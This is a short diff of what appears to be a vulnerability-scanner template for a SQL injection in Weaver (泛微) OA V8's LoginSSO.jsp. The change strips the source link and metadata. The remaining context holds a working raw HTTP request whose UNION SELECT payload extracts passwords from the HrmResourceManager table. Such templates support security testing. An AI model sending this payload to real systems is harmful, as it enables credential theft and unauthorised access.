@@ -3,12 +3,8 @@ info:
   name: 泛微 OA V8 LoginSSO.jsp 注入
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cbclfyescatdw6s9'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cbclfyescatdw6s9
-    fofa: 暂无
 http:
 - raw:
   - 'GET /upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager HTTP/1.1
